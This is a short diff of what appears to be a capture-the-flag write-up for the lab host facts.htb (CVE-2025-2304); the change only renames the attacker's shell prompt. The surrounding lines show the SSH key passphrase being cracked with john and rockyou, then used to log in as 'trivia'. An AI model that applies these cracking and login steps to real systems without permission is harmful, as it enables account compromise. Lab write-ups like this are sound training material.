@@ -194,7 +194,7 @@ cat hash.txt
        │ 0634127bf3d33953781fb06379661da6d1f465c908d77$24$130
 ───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 
-┌──[kali@Shieldbyte53]─[~/CVEs/CVE-2025-2304/loot] [main ✗]
+┌──[kali@0x3xp10i73r]─[~/CVEs/CVE-2025-2304/loot] [main ✗]
 └─❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
@@ -212,7 +212,7 @@ Session completed.
 The recovered passphrase is used to log in as `trivia`; the complete SSH session from the source note follows.
 
 ```bash
-┌──[kali@Shieldbyte53]─[~/CVEs/CVE-2025-2304/loot] [main ✗]
+┌──[kali@0x3xp10i73r]─[~/CVEs/CVE-2025-2304/loot] [main ✗]
 └─❯ ssh -i .ssh/id_ed25519 trivia@facts.htb
 The authenticity of host 'facts.htb (10.129.244.96)' can't be established.
 ED25519 key fingerprint is: SHA256:fygAnw6lqDbeHg2Y7cs39viVqxkQ6XKE0gkBD95fEzA
